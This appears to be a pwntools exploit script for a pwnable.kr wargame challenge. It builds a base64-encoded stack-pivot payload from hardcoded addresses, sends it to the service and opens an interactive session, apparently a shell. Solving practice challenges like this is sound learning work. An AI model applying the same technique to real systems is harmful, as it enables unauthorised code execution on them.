import socket
import pwn
import struct
import base64

IP = 'pwnable.kr'
PORT = 9003
SHELLCODE_ADDR = 0x08049278
INPUT_ADDR = 0x0811eb40

def main():
	
	payload = struct.pack ("<I", SHELLCODE_ADDR)
	payload += 'A' * 4
	payload += struct.pack ("<I", INPUT_ADDR - 4) # pop ebp will increase esp by 4!
	payload = base64.b64encode(payload)
	payload += '\n'

	s = pwn.remote (IP, PORT)
	s.send (payload)
	s.interactive()

	return

if __name__ == '__main__':
	main()